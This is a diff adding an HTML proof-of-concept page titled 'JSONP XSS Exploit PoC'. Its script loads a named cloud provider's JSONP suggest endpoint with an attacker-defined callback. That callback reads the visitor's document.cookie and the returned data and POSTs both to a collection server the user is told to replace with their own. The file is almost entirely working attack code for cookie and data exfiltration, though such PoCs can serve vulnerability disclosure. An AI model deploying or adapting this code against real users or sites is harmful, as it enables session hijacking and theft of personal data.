@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="referrer" content="no-referrer">
+    <title>JSONP XSS PoC</title>
+</head>
+<body>
+    <h1>JSONP XSS Exploit PoC</h1>
+    <script>
+        // Callback function that receives the data (cookies)
+        function call_me(data) {
+            // Send the data (victim's cookies) to your server
+            var http = new XMLHttpRequest();
+            var url = 'http://127.0.0.1/exploit/store.php'; // Replace with your server URL
+            var params = 'cookies=' + document.cookie + '&data=' + JSON.stringify(data);
+
+            http.open('POST', url, true);
+            http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+            
+            http.onreadystatechange = function() {
+                if(http.readyState == 4 && http.status == 200) {
+                    console.log('Data sent to server.');
+                }
+            };
+            http.send(params);
+        }
+
+        // Call the vulnerable endpoint, passing the `call_me` function as the callback
+        var script = document.createElement('script');
+        script.src = 'https://portal-intl.huaweicloud.com/rest/portal/v1/suggest?callback=call_me&q=数字货币交易所&from=nav&language=zh-cn&_=1642759632999'; // Vulnerable endpoint
+        document.body.appendChild(script);
+    </script>
+</body>
+</html>
